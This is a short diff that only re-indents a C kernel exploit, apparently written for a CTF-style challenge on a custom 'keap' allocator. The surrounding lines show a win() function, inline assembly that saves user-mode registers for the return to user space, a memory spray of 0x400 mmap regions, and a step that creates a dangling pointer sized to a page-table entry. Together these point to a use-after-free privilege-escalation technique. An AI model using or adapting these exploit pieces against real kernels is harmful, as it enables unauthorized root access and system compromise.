@@ -38,14 +38,14 @@ static void win() {
 uint64_t user_cs, user_ss, user_rsp, user_rflags;
 static void save_state() {
   asm(
-      "movq %%cs, %0\n"
-      "movq %%ss, %1\n"
-      "movq %%rsp, %2\n"
-      "pushfq\n"
-      "popq %3\n"
-      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
-      :
-      : "memory");
+    "movq %%cs, %0\n"
+    "movq %%ss, %1\n"
+    "movq %%rsp, %2\n"
+    "pushfq\n"
+    "popq %3\n"
+    : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
+    :
+    : "memory");
 }
 
 #define N_SPRAY 0x400
@@ -67,7 +67,7 @@ int main(int argc, char* argv[]) {
 
   for (int i = 0; i < N_SPRAY; i++)
     spray[i] = mmap((void*)(0xdead000000 + i*0x10000), 0x8000,
-             PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
+                    PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
 
   linfo("create dangeling ptr");
   ptr = keap_malloc(PTE_SIZE, GFP_KERNEL_ACCOUNT);
